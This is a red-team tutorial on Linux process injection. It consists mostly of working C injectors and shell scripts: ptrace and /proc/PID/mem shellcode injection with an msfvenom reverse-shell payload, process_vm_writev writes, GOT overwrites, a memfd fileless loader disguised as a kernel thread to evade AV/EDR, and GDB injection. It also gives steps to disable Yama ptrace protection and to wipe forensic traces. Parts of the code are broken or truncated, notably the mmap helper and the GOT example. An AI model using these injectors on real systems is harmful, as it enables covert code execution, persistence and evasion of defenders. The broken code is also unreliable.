Process Injection on Linux

ptrace-based shellcode injection, /proc/PID/mem manipulation, LD_PRELOAD, memfd_create fileless execution, process_vm_writev, and GDB scripting for red team operations.

Overview

Process injection runs attacker-controlled code inside an already running process, so the payload inherits the target's user, file descriptors, and network connections. After reading this article you can attach with ptrace, write shellcode through /proc/PID/mem or process_vm_writev , hijack execution through registers or the GOT, and run a fileless payload from a memfd.

Anatomy of Process Injection

Process injection is the technique of introducing arbitrary code into a running process and redirecting execution to it. The goal: run your payload in the context of another process, inheriting its permissions, network connections, and legitimacy.

The injection pipeline has three stages:

[1. ATTACH] ──► [2. INJECT] ──► [3. EXECUTE]
   │                │                │
   │ ptrace(2)      │ write(2)       │ PTRACE_SETREGS
   │ /proc/PID/mem  │ mmap(2)        │ GOT overwrite
   │ process_vm     │ pwrite(2)      │ signal handler

Each stage has constraints: the attachment method determines privilege requirements (ptrace requires CAP_SYS_PTRACE or same UID), the injection method determines where in memory code lands, and the execution trigger determines stealth.

/proc/PID/mem Injection

The /proc/PID/mem file is a memory image of the target process. With PTRACE_ATTACH , you can read and write any mapped virtual address. Before Linux 3.2, or with ptrace_scope=0 , you could write directly; the Yama LSM now restricts this.

The technique: open /proc/PID/mem , seek to the target's executable stack (or a mmap'd region), write shellcode, then redirect execution via SIGTR AP or register manipulation.

/*
 * proc_mem_inject.c — Inject shellcode via /proc/PID/mem
 * Compile: gcc -o proc_mem_inject proc_mem_inject.c
 * Usage:   sudo ./proc_mem_inject <target_pid>
 *
 * WARNING: Requires ptrace attachment. Yama LSM must allow it:
 *   echo 0 > /proc/sys/kernel/yama/ptrace_scope
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/types.h>
#include <errno.h>

/* Position-independent reverse shell shellcode (x86_64, Linux)
 * Connects to 127.0.0.1:4444, spawns /bin/sh
 * Generated with: msfvenom -p linux/x64/shell_reverse_tcp \
 *   LHOST=127.0.0.1 LPORT=4444 -f c */
unsigned char shellcode[] =
    "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
    "\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49"
    "\x89\xc4\x48\x89\xc7\x48\x31\xc0\x50\xc7\x44\x24\xfc\x7f\x00"
    "\x00\x01\x66\xc7\x44\x24\xfa\x11\x5c\xc6\x44\x24\xf8\x02\x48"
    "\x83\xec\x08\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x21\x58\x0f"
    "\x05\x48\xff\xc6\x6a\x21\x58\x0f\x05\x48\xff\xc6\x6a\x21\x58"
    "\x0f\x05\x48\x31\xc0\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73"
    "\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x6a\x3b\x58\x0f"
    "\x05";

size_t shellcode_len = sizeof(shellcode) - 1;

/* Read the target's /proc/PID/maps to find an executable region */
void find_executable_region(pid_t target_pid,
    unsigned long *start_addr, unsigned long *end_addr)
{
    char maps_path[256];
    snprintf(maps_path, sizeof(maps_path),
        "/proc/%d/maps", target_pid);

    FILE *maps_file = fopen(maps_path, "r");
    if (!maps_file) {
        perror("fopen /proc/PID/maps");
        exit(EXIT_FAILURE);
    }

    char line[512];
    while (fgets(line, sizeof(line), maps_file)) {
        unsigned long start, end;
        char permissions[8];
        sscanf(line, "%lx-%lx %4s", &start, &end, permissions);

        /* Look for an executable region that is NOT the stack
         * and NOT vDSO. Prefer the heap or an anonymous mapping. */
        if (permissions[2] == 'x' && strstr(line, "[heap]")) {
            *start_addr = start;
            *end_addr = end;
            fclose(maps_file);
            return;
        }
    }

    /* Fallback: use any writable+executable region */
    rewind(maps_file);
    while (fgets(line, sizeof(line), maps_file)) {
        unsigned long start, end;
        char permissions[8];
        sscanf(line, "%lx-%lx %4s", &start, &end, permissions);

        if (permissions[0] == 'r' && permissions[2] == 'x') {
            *start_addr = start;
            *end_addr = end;
            fclose(maps_file);
            return;
        }
    }

    fclose(maps_file);
    fprintf(stderr, "[-] No suitable executable region found\n");
    exit(EXIT_FAILURE);
}

/* Write shellcode via /proc/PID/mem at the given address */
void write_via_proc_mem(pid_t target_pid,
    unsigned long address, unsigned char *data, size_t length)
{
    char mem_path[256];
    snprintf(mem_path, sizeof(mem_path),
        "/proc/%d/mem", target_pid);

    int mem_fd = open(mem_path, O_RDWR);
    if (mem_fd < 0) {
        perror("open /proc/PID/mem");
        exit(EXIT_FAILURE);
    }

    if (lseek(mem_fd, address, SEEK_SET) < 0) {
        perror("lseek");
        close(mem_fd);
        exit(EXIT_FAILURE);
    }

    ssize_t written = write(mem_fd, data, length);
    if (written < 0) {
        perror("write to /proc/PID/mem");
        close(mem_fd);
        exit(EXIT_FAILURE);
    }

    printf("[+] Wrote %zd bytes at 0x%lx\n", written, address);
    close(mem_fd);
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target_pid>\n", argv[0]);
        return EXIT_FAILURE;
    }

    pid_t target_pid = atoi(argv[1]);
    printf("[*] Target PID: %d\n", target_pid);

    /* Step 1: Attach to the target with ptrace */
    printf("[*] Attaching to PID %d with ptrace...\n", target_pid);
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        perror("ptrace PTRACE_ATTACH");
        fprintf(stderr, "[-] Check ptrace_scope: "
            "cat /proc/sys/kernel/yama/ptrace_scope\n");
        return EXIT_FAILURE;
    }

    /* Wait for the target to stop */
    int status;
    waitpid(target_pid, &status, 0);
    if (!WIFSTOPPED(status)) {
        fprintf(stderr, "[-] Target did not stop\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return EXIT_FAILURE;
    }
    printf("[+] Target stopped\n");

    /* Step 2: Read original registers (save RIP for later) */
    struct user_regs_struct original_regs;
    if (ptrace(PTRACE_GETREGS, target_pid, NULL,
        &original_regs) < 0) {
        perror("ptrace PTRACE_GETREGS");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return EXIT_FAILURE;
    }
    printf("[+] Original RIP: 0x%llx\n", original_regs.rip);

    /* Step 3: Find an executable region in the target */
    unsigned long inject_start = 0, inject_end = 0;
    find_executable_region(target_pid,
        &inject_start, &inject_end);
    printf("[+] Injecting into region: 0x%lx - 0x%lx\n",
        inject_start, inject_end);

    /* Step 4: Write shellcode via /proc/PID/mem */
    write_via_proc_mem(target_pid,
        inject_start, shellcode, shellcode_len);

    /* Step 5: Redirect RIP to the shellcode */
    struct user_regs_struct new_regs = original_regs;
    new_regs.rip = inject_start;

    if (ptrace(PTRACE_SETREGS, target_pid, NULL,
        &new_regs) < 0) {
        perror("ptrace PTRACE_SETREGS");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return EXIT_FAILURE;
    }
    printf("[+] RIP redirected to 0x%lx\n", inject_start);

    /* Step 6: Continue the target — shellcode executes */
    printf("[*] Continuing target (shellcode executes)...\n");
    if (ptrace(PTRACE_CONT, target_pid, NULL, NULL) < 0) {
        perror("ptrace PTRACE_CONT");
        return EXIT_FAILURE;
    }

    /* For a reverse shell, the target process is now blocked
     * in the shellcode. Wait for it to exit (shell exits). */
    waitpid(target_pid, &status, 0);
    printf("[*] Target exited (shell closed)\n");

    return EXIT_SUCCESS;
}

Verification

After injection, check /proc/PID/maps :

# Run the injector
sudo ./proc_mem_inject 12345

# In another terminal, verify the shellcode in the target's memory
sudo dd if=/proc/12345/mem bs=1 skip=$((0xINJECT_ADDR)) count=100 2>/dev/null | xxd

# Check for listening connections (reverse shell listener should catch it)
nc -lvnp 4444

ptrace POKETEXT Injection

Instead of /proc/PID/mem , use PTRACE_POKETEXT to write 8 bytes at a time into the target's text segment. This avoids the /proc/PID/mem file descriptor altogether:

/*
 * ptrace_poke_inject.c — Inject shellcode using PTRACE_POKETEXT
 * Compile: gcc -o ptrace_poke_inject ptrace_poke_inject.c
 * Usage:   sudo ./ptrace_poke_inject <target_pid>
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <errno.h>

/* Simple execve("/bin/sh", NULL, NULL) shellcode (27 bytes) */
unsigned char exec_sh_shellcode[] =
    "\x48\x31\xd2"                  /* xor    %rdx, %rdx           */
    "\x48\xbb\x2f\x2f\x62\x69\x6e"  /* movabs $0x68732f6e69622f2f,%rbx */
    "\x2f\x73\x68"
    "\x48\xc1\xeb\x08"              /* shr    $0x8, %rbx           */
    "\x53"                          /* push   %rbx                 */
    "\x48\x89\xe7"                  /* mov    %rsp, %rdi           */
    "\x50"                          /* push   %rax                 */
    "\x57"                          /* push   %rdi                 */
    "\x48\x89\xe6"                  /* mov    %rsp, %rsi           */
    "\xb0\x3b"                      /* mov    $0x3b, %al           */
    "\x0f\x05";                     /* syscall                     */

size_t shellcode_size = sizeof(exec_sh_shellcode) - 1;

/* Use ptrace to invoke mmap in the target and allocate RWX memory */
unsigned long remote_mmap(pid_t target_pid, size_t size)
{
    struct user_regs_struct saved_regs, call_regs;
    unsigned long mmap_addr;

    /* Save current registers */
    ptrace(PTRACE_GETREGS, target_pid, NULL, &saved_regs);
    call_regs = saved_regs;

    /* Find mmap in the remote process's libc
     * This requires parsing /proc/PID/maps to find libc base
     * For simplicity, we read /proc/PID/syscall after a benign call
     * Or we hard-code: mmap is at a known offset in libc
     * Better approach: use the vDSO or read /proc/PID/maps */

    char maps_path[256];
    snprintf(maps_path, sizeof(maps_path),
        "/proc/%d/maps", target_pid);

    FILE *maps_file = fopen(maps_path, "r");
    if (!maps_file) {
        perror("fopen maps");
        return 0;
    }

    unsigned long libc_base = 0;
    char line[512];
    while (fgets(line, sizeof(line), maps_file)) {
        if (strstr(line, "libc") && strstr(line, "r-xp")) {
            sscanf(line, "%lx-", &libc_base);
            break;
        }
    }
    fclose(maps_file);

    if (!libc_base) {
        fprintf(stderr, "[-] Could not find libc in target\n");
        return 0;
    }
    printf("[+] libc base: 0x%lx\n", libc_base);

    /* Calculate mmap address (this offset varies per libc version)
     * We use dlsym-like resolution from the injector's own libc
     * offset, assuming the same libc version. */
    void *injector_mmap = dlsym(RTLD_DEFAULT, "mmap");
    if (!injector_mmap) {
        perror("dlsym mmap");
        return 0;
    }

    /* Get our own libc base */
    void *injector_libc = NULL;
    dladdr(injector_mmap, &injector_libc);
    /* ... dladdr is complex, simplified: use offset from /proc/self/maps */
    /* For the example, we skip dynamic resolution and use syscall directly */
    return 0; /* See full example below with syscall approach */
}

/* Alternative: use process_vm_writev for the write portion */
int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target_pid>\n", argv[0]);
        return EXIT_FAILURE;
    }

    pid_t target_pid = atoi(argv[1]);
    printf("[*] Target PID: %d\n", target_pid);

    /* Attach */
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        perror("PTRACE_ATTACH");
        return EXIT_FAILURE;
    }

    int status;
    waitpid(target_pid, &status, 0);
    if (!WIFSTOPPED(status)) {
        fprintf(stderr, "[-] Target did not stop\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return EXIT_FAILURE;
    }
    printf("[+] Target stopped at signal %d\n", WSTOPSIG(status));

    /* Save registers */
    struct user_regs_struct original_regs, inject_regs;
    ptrace(PTRACE_GETREGS, target_pid, NULL, &original_regs);
    inject_regs = original_regs;
    printf("[+] Original RIP: 0x%llx\n", original_regs.rip);

    /* For a simpler approach: find an RWX region via /proc/PID/maps
     * and use PTRACE_POKETEXT to write the shellcode word by word */
    char maps_path[256];
    snprintf(maps_path, sizeof(maps_path),
        "/proc/%d/maps", target_pid);

    FILE *maps = fopen(maps_path, "r");
    unsigned long rwx_addr = 0, rwx_end = 0;
    char map_line[512];
    while (fgets(map_line, sizeof(map_line), maps)) {
        unsigned long start, end;
        char perm[8];
        if (sscanf(map_line, "%lx-%lx %4s", &start, &end, perm) == 3) {
            /* Look for an anonymous RWX mapping or stack */
            if (strchr(perm, 'x') && strchr(perm, 'w') &&
                (strstr(map_line, "[stack]") ||
                 strstr(map_line, "00000000"))) {
                rwx_addr = start;
                rwx_end = end;
                break;
            }
        }
    }
    fclose(maps);

    if (!rwx_addr) {
        fprintf(stderr, "[-] No writable+executable region found\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return EXIT_FAILURE;
    }
    printf("[+] RWX region: 0x%lx - 0x%lx\n", rwx_addr, rwx_end);

    /* Pad shellcode to multiple of 8 for PTRACE_POKETEXT */
    size_t padded_len = (shellcode_size + 7) & ~7;
    unsigned char padded_shellcode[4096];
    memset(padded_shellcode, 0x90, padded_len);  /* NOP sled */
    memcpy(padded_shellcode, exec_sh_shellcode, shellcode_size);

    /* Write shellcode 8 bytes at a time */
    for (size_t offset = 0; offset < padded_len; offset += 8) {
        unsigned long word;
        memcpy(&word, padded_shellcode + offset, sizeof(word));

        if (ptrace(PTRACE_POKETEXT, target_pid,
            (void *)(rwx_addr + offset), (void *)word) < 0) {
            perror("PTRACE_POKETEXT");
            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return EXIT_FAILURE;
        }
    }
    printf("[+] Shellcode written (%zu bytes)\n", padded_len);

    /* Redirect RIP */
    inject_regs.rip = rwx_addr;
    if (ptrace(PTRACE_SETREGS, target_pid, NULL,
        &inject_regs) < 0) {
        perror("PTRACE_SETREGS");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return EXIT_FAILURE;
    }
    printf("[+] RIP set to 0x%lx\n", rwx_addr);

    /* Continue execution */
    printf("[*] Continuing target...\n");
    ptrace(PTRACE_CONT, target_pid, NULL, NULL);
    waitpid(target_pid, &status, 0);

    /* Restore original registers if target survives */
    ptrace(PTRACE_SETREGS, target_pid, NULL, &original_regs);
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    printf("[+] Detached\n");

    return EXIT_SUCCESS;
}

Yama LSM and ptrace_scope

The Yama Linux Security Module restricts ptrace access to prevent exactly this attack. The value in /proc/sys/kernel/yama/ptrace_scope controls the restriction:

Value Name Behavior
0 Classic Any process can ptrace any other (same UID)
1 Restricted (default) Only parent-child or processes with CAP_SYS_PTRACE
2 Admin-only Only processes with CAP_SYS_PTRACE
3 No-attach ptrace completely disabled

Bypass as Root

If you have root, disable it:

echo 0 > /proc/sys/kernel/yama/ptrace_scope
# Or persistently:
echo 'kernel.yama.ptrace_scope = 0' >> /etc/sysctl.d/99-injection.conf
sysctl -p /etc/sysctl.d/99-injection.conf

Bypass Without Root

If you are the parent of the target (you forked it yourself), ptrace_scope=1 still allows attachment.

process_vm_writev Injection

process_vm_writev(2) writes data directly into another process's memory without a PTRACE_ATTACH . Permission is governed by the PTRACE_MODE_ATTACH_REALCREDS check, so the caller needs the same UID or CAP_SYS_PTRACE , and Yama's ptrace_scope rules still apply because the kernel runs the same ptrace_may_access check. The syscall writes memory; it does not redirect execution, so you still need a separate trigger.

/*
 * pvm_inject.c — Inject via process_vm_writev (no ptrace)
 * Compile: gcc -o pvm_inject pvm_inject.c
 * Usage:   ./pvm_inject <target_pid> <shellcode_address>
 *
 * No PTRACE_ATTACH needed. Target must share your UID, or you need
 * CAP_SYS_PTRACE. Yama ptrace_scope still applies via ptrace_may_access.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <errno.h>

/* /bin/sh shellcode */
unsigned char shellcode[] =
    "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    "\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6"
    "\xb0\x3b\x0f\x05";

size_t shellcode_len = sizeof(shellcode) - 1;

int main(int argc, char **argv)
{
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <target_pid> <remote_address>\n", argv[0]);
        fprintf(stderr, "  remote_address: address in target to write to\n");
        fprintf(stderr, "  Get this from /proc/PID/maps (look for RWX or stack)\n");
        return EXIT_FAILURE;
    }

    pid_t target_pid = atoi(argv[1]);
    unsigned long remote_addr = strtoul(argv[2], NULL, 0);

    struct iovec local_iov;
    struct iovec remote_iov;

    local_iov.iov_base = shellcode;
    local_iov.iov_len = shellcode_len;
    remote_iov.iov_base = (void *)remote_addr;
    remote_iov.iov_len = shellcode_len;

    ssize_t written = process_vm_writev(
        target_pid,      /* target PID */
        &local_iov,      /* local buffers */
        1,               /* local iov count */
        &remote_iov,     /* remote buffers */
        1,               /* remote iov count */
        0);              /* flags */

    if (written < 0) {
        perror("process_vm_writev");
        return EXIT_FAILURE;
    }

    printf("[+] Wrote %zd bytes to PID %d at 0x%lx\n",
        written, target_pid, remote_addr);
    printf("[!] Shellcode written. You still need to trigger execution\n");
    printf("[!] Options:\n");
    printf("    - Send SIGTRAP to redirect to the address\n");
    printf("    - Overwrite GOT entry\n");
    printf("    - Overwrite return address on stack\n");
    printf("    - Use ptrace to SETREGS (requires PTRACE_ATTACH first)\n");

    return EXIT_SUCCESS;
}

Trigger Execution

After writing with process_vm_writev you still need a redirect. Since you are the same UID, you can:

# 1. Send SIGSTOP, then use PTRACE_ATTACH + PTRACE_SETREGS + PTRACE_DETACH
# 2. Or overwrite a function pointer / GOT entry that will be called naturally
# 3. Or use the kernel's uprobe mechanism

GOT Overwrite via /proc/PID/mem

Overwriting a Global Offset Table (GOT) entry redirects a library function call to your shellcode. When the target calls printf() , it jumps to the GOT entry for printf , which now points to your code.

/*
 * got_overwrite.c — GOT overwrite injection via /proc/PID/mem
 * Compile: gcc -o got_overwrite got_overwrite.c
 * Usage:   sudo ./got_overwrite <target_pid>
 *
 * This overwrites the GOT entry for a commonly-called function (sleep, printf)
 * to point to shellcode, then restores it after execution.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <elf.h>

/* Resolve a GOT entry address from /proc/PID/maps and the ELF */
unsigned long find_got_entry(pid_t pid, const char *func_name)
{
    char maps_path[256], exe_path[256];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);

    /* Find the target's text/data base addresses */
    FILE *maps = fopen(maps_path, "r");
    unsigned long text_base = 0, data_base = 0;
    char line[512];
    while (fgets(line, sizeof(line), maps)) {
        unsigned long start;
        char perm[8], path[256] = {0};
        if (sscanf(line, "%lx-%*x %4s %*s %*s %*s %255s",
            &start, perm, path) >= 2) {
            if (perm[2] == 'x' && text_base == 0) {
                text_base = start;
            }
            if (perm[1] == 'w' && strstr(perm, "p") &&
                path[0] != '[' && data_base == 0) {
                data_base = start;
            }
        }
    }
    fclose(maps);

    if (!text_base || !data_base) {
        fprintf(stderr, "[-] Could not find bases\n");
        return 0;
    }

    printf("[+] Text base: 0x%lx, Data base: 0x%lx\n",
        text_base, data_base);

    /* Read the ELF to find GOT entries
     * The GOT is in the data segment. We need the .got.plt section.
     * For simplicity, we read the ELF headers and parse sections. */
    int exe_fd = open(exe_path, O_RDONLY);
    if (exe_fd < 0) {
        perror("open /proc/PID/exe");
        return 0;
    }

    /* Read ELF header to find section headers */
    Elf64_Ehdr ehdr;
    if (read(exe_fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) {
        perror("read ELF header");
        close(exe_fd);
        return 0;
    }

    /* Read section header string table */
    char *shstrtab = NULL;
    off_t sht_offset = ehdr.e_shoff;
    size_t sht_size = ehdr.e_shnum * ehdr.e_shentsize;

    Elf64_Shdr *shdrs = malloc(sht_size);
    lseek(exe_fd, sht_offset, SEEK_SET);
    read(exe_fd, shdrs, sht_size);

    /* Read string table for section names */
    Elf64_Shdr *shstrtab_hdr = &shdrs[ehdr.e_shstrndx];
    size_t strtab_size = shstrtab_hdr->sh_size;
    shstrtab = malloc(strtab_size);
    lseek(exe_fd, shstrtab_hdr->sh_offset, SEEK_SET);
    read(exe_fd, shstrtab, strtab_size);

    /* Find .got.plt section */
    unsigned long got_addr = 0;
    size_t got_size = 0;
    for (int i = 0; i < ehdr.e_shnum; i++) {
        char *section_name = shstrtab + shdrs[i].sh_name;
        if (strcmp(section_name, ".got.plt") == 0) {
            got_addr = shdrs[i].sh_addr;
            got_size = shdrs[i].sh_size;
            printf("[+] .got.plt at 0x%lx (size %zu)\n",
                got_addr, got_size);

            /* Adjust for PIE: offset from text base */
            if (text_base != 0 && got_addr < text_base + 0x100000) {
                /* Dynamic entries: read .rela.plt for exact offsets */
            }
            break;
        }
    }

    free(shdrs);
    free(shstrtab);
    close(exe_fd);

    if (!got_addr) {
        fprintf(stderr, "[-] .got.plt section not found\n");
        return 0;
    }

    return got_addr;
}

{
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <target_pid> <got_address_in_remote>\n",
            argv[0]);

memfd_create - Fileless Execution

memfd_create(2) creates an anonymous file in memory (backed by tmpfs, not disk). Combined with fexecve(3) , you can execute an ELF binary that never touches the filesystem, bypassing file-based AV/ EDR .

/*
 * memfd_exec.c — Execute an ELF from memory (fileless)
 * Compile: gcc -o memfd_exec memfd_exec.c
 * Usage:   ./memfd_exec /path/to/embedded/payload
 *
 * The payload is executed from a memfd — no file on disk ever.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <errno.h>

int main(int argc, char **argv)
{
    const char *payload_path = (argc > 1) ? argv[1] : NULL;

    /* Read the payload binary into memory */
    int payload_fd = open(payload_path, O_RDONLY);
    if (payload_fd < 0) {
        perror("open payload");
        return EXIT_FAILURE;
    }

    struct stat payload_stat;
    fstat(payload_fd, &payload_stat);
    size_t payload_size = payload_stat.st_size;

    unsigned char *payload_data = mmap(NULL, payload_size,
        PROT_READ, MAP_PRIVATE, payload_fd, 0);
    close(payload_fd);

    if (payload_data == MAP_FAILED) {
        perror("mmap payload");
        return EXIT_FAILURE;
    }

    /* Create an anonymous memory file */
    int mem_fd = memfd_create("", MFD_CLOEXEC);
    /* The empty string makes it truly anonymous — no name in
     * /proc/self/fd. Use "libsystem" or similar for disguise. */
    if (mem_fd < 0) {
        /* Fallback: use shm_open */
        mem_fd = shm_open("/.payload", O_RDWR | O_CREAT | O_EXCL, 0700);
        if (mem_fd < 0) {
            perror("memfd_create / shm_open");
            munmap(payload_data, payload_size);
            return EXIT_FAILURE;
        }
        shm_unlink("/.payload");
    }

    /* Write the ELF to the memfd */
    if (write(mem_fd, payload_data, payload_size) !=
        (ssize_t)payload_size) {
        perror("write to memfd");
        close(mem_fd);
        munmap(payload_data, payload_size);
        return EXIT_FAILURE;
    }
    munmap(payload_data, payload_size);

    /* Execute the memfd */
    char *cmd_argv[] = { "[kworker/0:1]", (argc > 2) ? argv[2] : NULL, NULL };
    char *cmd_envp[] = { NULL };

    /* Use fexecve to execute the memfd directly */
    fexecve(mem_fd, cmd_argv, cmd_envp);

    /* If fexecve returns, it failed */
    perror("fexecve");

    /* Fallback: exec the fd path via /proc */
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", mem_fd);
    execve(fd_path, cmd_argv, cmd_envp);

    perror("execve fallback");
    close(mem_fd);
    return EXIT_FAILURE;
}

GDB Injection (Scripted)

GDB is typically installed on development servers. It provides a higher-level interface to ptrace:

#!/bin/bash
# gdb_inject.sh — Inject shellcode into a process using GDB
# Usage: sudo bash gdb_inject.sh <pid> <shellcode_address>

TARGET_PID=$1
SHELLCODE_FILE="/tmp/sc.bin"   # raw shellcode bytes

# Generate shellcode (example: exit(0) syscall)
python3 -c "
import sys
# mov eax, 60; xor edi, edi; syscall
sc = b'\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05'
sys.stdout.buffer.write(sc)
" > "$SHELLCODE_FILE"

# Use GDB to inject
gdb -p "$TARGET_PID" -batch \
    -ex "set \$shellcode_addr = 0x7ffff7fc1000" \
    -ex "restore $SHELLCODE_FILE binary \$shellcode_addr" \
    -ex "set \$rip = \$shellcode_addr" \
    -ex "continue" 2>/dev/null

rm -f "$SHELLCODE_FILE"

GDB Stealth

GDB leaves traces. It writes to .gdb_history , loads Python scripts in ~/.gdbinit , and generates core dumps on segfaults. Clean up:

rm -f ~/.gdb_history /var/crash/*
echo 'set confirm off' > /tmp/.gdbinit
HOME=/tmp gdb -p "$TARGET_PID" -batch ...  # isolate history

Verification Steps

After performing injection, verify the state:

# 1. Verify shellcode in memory
sudo cat /proc/PID/maps | grep -E 'rwx'
sudo dd if=/proc/PID/mem bs=1 skip=<address> count=<size> 2>/dev/null | xxd

# 2. Check for anonymous executable mappings (memfd)
cat /proc/PID/maps | grep 'memfd:'

# 3. Verify ptrace attachments
cat /proc/PID/status | grep -E 'TracerPid|ptrace'

# 4. Check for LD_PRELOAD in environment
cat /proc/PID/environ | tr '\0' '\n' | grep LD_PRELOAD

# 5. Monitor syscalls
sudo strace -p PID -e trace=ptrace,process_vm_writev,memfd_create

Common Mistakes

  1. Forgetting to attach before writing to /proc/PID/mem : Since Linux 3.2, writing to /proc/PID/mem requires ptrace attachment. Without it, writes fail silently or with EIO.
  1. Writing to non-executable memory : Shellcode in a non-executable page triggers SIGSEGV. Always verify the region has x in /proc/PID/maps .
  1. Not accounting for ASLR : Addresses from readelf or local compilation differ from the running process. Always parse /proc/PID/maps and compute offsets.
  1. Shellcode not position-independent : Hardcoded addresses or absolute jumps break after injection. Use relative addressing and syscall-based shellcode.
  1. Leaving the target in an inconsistent state : After shellcode finishes, the target's registers and stack are corrupted. If it doesn't crash (e.g., a reverse shell that runs long), you're fine. For quick payloads, restore registers after the shellcode returns.
  1. Assuming same libc offsets : When using PTRACE_POKETEXT to call dlopen , the offset of __libc_dlopen_mode varies across libc versions. Parse /proc/PID/maps and compute offsets at runtime.
  1. Not testing on the actual target kernel : Kernel configurations differ. memfd_create requires Linux 3.17+. process_vm_writev requires Linux 3.2+. Yama may be compiled out entirely on some embedded systems.
